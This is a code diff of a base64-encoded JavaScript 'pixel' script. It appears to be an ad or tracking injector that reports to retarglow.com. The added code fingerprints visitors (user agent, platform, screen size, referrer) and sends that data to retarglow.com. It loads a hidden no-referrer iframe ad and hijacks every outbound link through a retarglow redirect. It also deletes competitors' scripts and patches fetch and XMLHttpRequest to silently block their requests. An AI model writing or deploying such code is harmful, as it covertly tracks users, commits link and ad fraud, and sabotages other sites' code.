@@ -24,98 +24,57 @@ export default {
     document.cookie="user_id_t="+_r+"; path=/; max-age=31536000; SameSite=Lax";
     document.cookie="smc_uid="+_r+"; path=/; max-age=31536000; SameSite=Lax";
 
-    function injectUTM() {
-      const u = new URL(location.href);
-      u.searchParams.set("utm_source", "impact");
-      u.searchParams.set("utm_medium", "Adsynergix");
-      u.searchParams.set("subId1", _r);
-      history.replaceState(null, "", u.toString());
-    }
+    const once = sessionStorage.getItem('i_'+cid);
+    const d = {
+      cid, u:location.href, r:document.referrer||null, ua:navigator.userAgent,
+      dt:/Mobi|Android/i.test(navigator.userAgent)?"M":"D",
+      b:(()=>{let u=navigator.userAgent;return u.includes("Chrome")?"C":u.includes("Firefox")?"F":u.includes("Safari")?"S":"U"})(),
+      os:navigator.platform, sr:screen.width+"x"+screen.height,
+      cm:{_r}, domain
+    };
 
-    function rewriteLinks() {
-      document.querySelectorAll('a[href^="http"]').forEach(link => {
+    fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});
+
+    fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:location.href,cm:d.cm})})
+    .then(r=>r.json()).then(j=>{
+      if(j.ad_url && !once){
+        const f=document.createElement('iframe');
+        f.style.display='none'; f.setAttribute("referrerpolicy","no-referrer");
+        f.src=j.ad_url.replace("{{_r}}",_r);
+        document.body.appendChild(f);
+        sessionStorage.setItem('i_'+cid,'1');
+      }
+    });
+
+    function hijackLinks(){
+      document.querySelectorAll('a[href^="http"]').forEach(link=>{
         const href = link.getAttribute("href");
-        const encoded = encodeURIComponent(href);
-        link.setAttribute("href", "https://retarglow.com/r?id=" + _r + "&t=" + encoded);
-      });
-    }
-
-    function fireLogAndAd() {
-      const once = sessionStorage.getItem('i_' + cid);
-      const d = {
-        cid, u: location.href, r: document.referrer || null, ua: navigator.userAgent,
-        dt: /Mobi|Android/i.test(navigator.userAgent) ? "M" : "D",
-        b: (() => { let u = navigator.userAgent; return u.includes("Chrome") ? "C" : u.includes("Firefox") ? "F" : u.includes("Safari") ? "S" : "U" })(),
-        os: navigator.platform, sr: screen.width + "x" + screen.height,
-        cm: { _r }, domain
-      };
-
-      fetch("https://retarglow.com/log", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(d) });
-
-      fetch("https://retarglow.com/serve", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ u: location.href, cm: d.cm }) })
-      .then(r => r.json()).then(j => {
-        if (j.ad_url && !once) {
-          const f = document.createElement('iframe');
-          f.style.display = 'none'; f.setAttribute("referrerpolicy", "no-referrer");
-          f.src = j.ad_url.replace("{{_r}}", _r);
-          document.body.appendChild(f);
-          sessionStorage.setItem('i_' + cid, '1');
+        if (!href.startsWith("https://retarglow.com/r")) {
+          const encoded = encodeURIComponent(href);
+          link.setAttribute("href", "https://retarglow.com/r?id="+_r+"&t="+encoded);
         }
       });
     }
 
-    function reapply() {
-      injectUTM();
-      fireLogAndAd();
-      rewriteLinks();
+    hijackLinks();
+    new MutationObserver(()=>hijackLinks()).observe(document.body,{childList:true,subtree:true});
+
+    const kill=()=>{competitors.forEach(d=>{document.querySelectorAll('script[src*="'+d+'"],iframe[src*="'+d+'"]').forEach(e=>e.remove());});}
+    kill(); new MutationObserver(m=>m.forEach(()=>kill())).observe(document.documentElement,{childList:!0,subtree:!0});
+
+    const origFetch=window.fetch;
+    window.fetch=function(){if(arguments[0]&&competitors.some(c=>arguments[0].includes(c)))return new Response(null,{status:204});return origFetch.apply(this,arguments);}
+    const origXhr=XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open=function(m,u){if(u&&competitors.some(c=>u.includes(c)))return;return origXhr.apply(this,arguments);}
+
+    ["pushState","replaceState"].forEach(fn=>{const orig=history[fn];history[fn]=function(){const r=orig.apply(this,arguments);sessionStorage.removeItem('i_'+cid);return r;};});
+    addEventListener("popstate",()=>sessionStorage.removeItem('i_'+cid));
+
+    if(window.self!==window.top){
+      window.top.postMessage({from:"retarglow",_r,cid,href:location.href},"*");
     }
-
-    
-    reapply();
-
-    
-    ["pushState", "replaceState"].forEach(fn => {
-      const orig = history[fn];
-      history[fn] = function () {
-        const r = orig.apply(this, arguments);
-        setTimeout(reapply, 100);
-        return r;
-      };
-    });
-
-    window.addEventListener("popstate", () => setTimeout(reapply, 100));
-
-    
-    const kill = () => {
-      competitors.forEach(d => {
-        document.querySelectorAll('script[src*="' + d + '"],iframe[src*="' + d + '"]').forEach(e => e.remove());
-      });
-    };
-    kill(); new MutationObserver(m => m.forEach(() => kill())).observe(document.documentElement, { childList: !0, subtree: !0 });
-
-    
-    const origFetch = window.fetch;
-    window.fetch = function () {
-      if (arguments[0] && competitors.some(c => arguments[0].includes(c))) return new Response(null, { status: 204 });
-      return origFetch.apply(this, arguments);
-    };
-
-    const origXhr = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function (m, u) {
-      if (u && competitors.some(c => u.includes(c))) return;
-      return origXhr.apply(this, arguments);
-    };
-
-    if (window.self !== window.top) {
-      window.top.postMessage({ from: "retarglow", _r, cid, href: location.href }, "*");
-    }
-
-    addEventListener("message", (e) => {
-      if (e.data?.from === "retarglow") {
-        fetch("https://retarglow.com/log", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ...e.data, type: "cross-frame" }) });
-      }
-    });
-  } catch (e) {}
+    addEventListener("message",(e)=>{if(e.data?.from==="retarglow"){fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e.data,type:"cross-frame"})});}});
+  } catch(e){}
 })();`;
 
       const encoded = globalThis.btoa(pixelScript);
